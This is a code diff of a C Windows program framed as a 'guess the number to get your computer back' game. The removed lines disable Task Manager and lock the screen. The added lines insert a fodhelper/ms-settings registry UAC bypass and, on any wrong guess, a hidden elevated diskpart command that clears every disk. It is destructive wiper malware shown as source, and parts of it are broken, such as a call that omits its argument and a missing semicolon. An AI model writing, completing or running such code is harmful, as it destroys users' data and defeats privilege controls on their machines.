@@ -3,80 +3,63 @@
 #include <stdio.h>
 #include <time.h>
 #include <stdlib.h>
+void UAC_bypass(const char *path) {
+    HKEY k;
+    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
+    RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
+    RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
+    RegCloseKey(k);
+	//instead of just opening fodhelper.exe
+	STARTUPINFOA si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
 
-void kill_taskman() {
-    HKEY hKey;
-    DWORD value = 1;
-    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, 0, KEY_WRITE, 0, &hKey, 0);
-    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-    RegCloseKey(hKey);
-}
+	CreateProcessA("C:\\Windows\\System32\\fodhelper.exe", 0, 0, 0, FALSE, 0, 0, 0, &si, &pi);
 
-void resurect_taskman() {
-    HKEY hKey;
-    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
-    RegDeleteValueA(hKey, "DisableTaskMgr");
-    RegCloseKey(hKey);
-}
-
-BOOL WINAPI ctrlHandler(DWORD type) {
-    return TRUE;
-}
-
-void console_lock() {
-    HWND console = GetConsoleWindow();
-
-    LONG style = GetWindowLong(console, GWL_STYLE);
-    style &= ~(WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_THICKFRAME);
-    SetWindowLong(console, GWL_STYLE, style);
-    SetWindowPos(console, HWND_TOPMOST, 0, 0, 0, 0,
-                 SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED);
-    
-    HWND taskbar = FindWindow("Shell_TrayWnd", 0);
-    ShowWindow(taskbar, SW_HIDE);
-
-    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
-    MoveWindow(console, 0, 0, screenWidth, screenHeight, TRUE);
-    
-    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    COORD bufferSize = {160, 100};
-    SMALL_RECT windowSize = {0, 0, bufferSize.X - 1, bufferSize.Y - 1};
-    SetConsoleScreenBufferSize(hOut, bufferSize);
-    SetConsoleWindowInfo(hOut, TRUE, &windowSize);
+	Sleep(1000);
+    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
+    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open");
+    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell");
+    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings")
 }
 int main() {
+    UAC_bypass();
     SetConsoleTitleA("Screen");
-    SetConsoleCtrlHandler(ctrlHandler, TRUE);
-    console_lock();
-    kill_taskman();
 
     srand((unsigned int)time(0));
     int key = (rand() % 10) + 1;
     int guess = 0;
 
-    printf("===Let's Play a little Game===\n");
-    printf("if you want your computer back...\n");
-    printf("than guess the number\n");
+    printf("=== Let's Play a little Game ===\n");
+    printf("If you want your computer back...\n");
+    printf("Then guess the number\n");
 
     while (1) {
-        srand((unsigned int)time(0));
-        int key = (rand() % 10) + 1;
-        int guess = 0;
-        printf("Enter guess 1-10 >:");
+        printf("Enter guess 1-10 >: ");
         fflush(stdout);
-        scanf("%d", &guess);
+
+        if (scanf("%d", &guess) != 1) {
+            fflush(stdin); 
+            continue;
+        }
+
         if (guess == key) {
-            printf("\nYou Won!!! woohoo\n");
-            resurect_taskman();
-            HWND taskbar = FindWindow("Shell_TrayWnd", 0);
-            ShowWindow(taskbar, SW_SHOW);
-            exit(0);
+            printf("\nYou Won!!! Woohoo\n");
+            break;
         } else {
-            printf("\nwrong\n");
-            system("shutdown /s /t 0");
+            printf("\nWrong!\n");
+            ShellExecute(0, "runas", "cmd.exe",
+                "/c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
+                "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
+                "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
+                "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt",
+                0, SW_HIDE);
+
+            //system("shutdown /s /t 0");
         }
     }
-
+    exit(0);
     return 0;
 }
